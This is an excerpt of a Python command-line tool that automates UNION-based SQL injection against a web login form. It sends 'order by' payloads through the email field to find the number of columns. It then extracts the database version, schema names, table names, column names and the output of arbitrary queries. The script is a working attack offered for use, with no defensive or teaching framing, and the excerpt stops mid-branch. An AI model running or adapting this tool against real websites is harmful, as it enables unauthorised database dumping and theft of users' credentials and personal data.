...
def make_request(url: str, content_length: int, email_field: str, password_field: str) -> int:
    for x in range(100, 0, -1):
        ress = requests.post(url=url, data={email_field: f"' order by {x}-- -", password_field: "test"})
        if len(ress.text) != content_length:
            print("The number of columns inside the table:", x)
            return x
    return 0

def make_sqli(url: str, num_columns: int, keyword: str, email_field: str, password_field: str):
    column_placeholders = ','.join(str(i) for i in range(1, num_columns))
    
    # Obtener la versión de la base de datos
    data = {email_field: f"' union select {column_placeholders},@@version-- -", password_field: "test"}
    response = requests.post(url=url, data=data)
    print(find_and_print(response.text.strip(), keyword))
    
    # Obtener los nombres de las bases de datos
    data = {email_field: f"' union select {column_placeholders},schema_name from information_schema.schemata-- -", password_field: "test"}
    response = requests.post(url=url, data=data)
    print(find_and_print(response.text.strip(), keyword))
    ...
    data = {email_field: f"' union select {column_placeholders},table_name from information_schema.tables where table_schema='{table_schema}'-- -", password_field: "test"}
    response = requests.post(url=url, data=data)
    print(find_and_print(response.text.strip(), keyword))
    ...
    data = {email_field: f"' union select {column_placeholders},column_name from information_schema.columns where table_name='{table_name}'-- -", password_field: "test"}
    response = requests.post(url=url, data=data)
    print(find_and_print(response.text.strip(), keyword))
    ...
    data = {email_field: sql_query, password_field: "test"}
    response = requests.post(url=url, data=data)
    print(find_and_print(response.text.strip(), keyword))
...
def main():
    parser = argparse.ArgumentParser(
        ...
        epilog="Example: python s9.py http://example.com/login --content 33490 --keyword Welcome --email email --pass password\n\n"
    ...
    parser.add_argument(
        ...
        help="Name of the email field in the form."
    )
    parser.add_argument(
        "--pass",
        type=str,
        default="password",
        help="Name of the password field in the form."
    )
    ...
    try:
        ...
        num_columns = make_request(url, content_length, email_field, password_field)
        
        if num_columns:
            make_sqli(url, num_columns, keyword, email_field, password_field)
        else:
